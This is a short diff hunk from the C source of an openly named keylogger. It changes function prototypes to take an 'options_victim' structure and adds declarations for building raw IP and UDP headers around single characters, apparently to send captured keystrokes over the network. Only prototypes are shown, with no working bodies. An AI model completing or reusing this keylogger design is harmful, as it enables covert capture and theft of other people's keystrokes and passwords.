@@ -83,12 +83,14 @@ static const char *keycodes[] = {
 };
 
 
-void keylogger_main(void);
+void keylogger_main(struct options_victim* ov);
 char* get_keyboard_event_file(void);
-void keylogger(int keyboard, int writeout);
-void safe_write_all(int file_desc, const char *str, int keyboard);
-int write_all(int file_desc, const char *str);
+void keylogger(int keyboard, int writeout, struct options_victim* ov);
+void safe_write_all(int file_desc, const char *str, int keyboard, struct options_victim* ov);
+int write_all(int file_desc, const char *str, struct options_victim* ov);
 void sigint_handler(int sig);
+unsigned short create_cvc_ip_header(struct iphdr* ih, char c, struct options_victim* ov);
+unsigned short create_cvc_udp_header(struct udphdr* uh);
 static int is_char_device(const struct dirent *file);
 
 
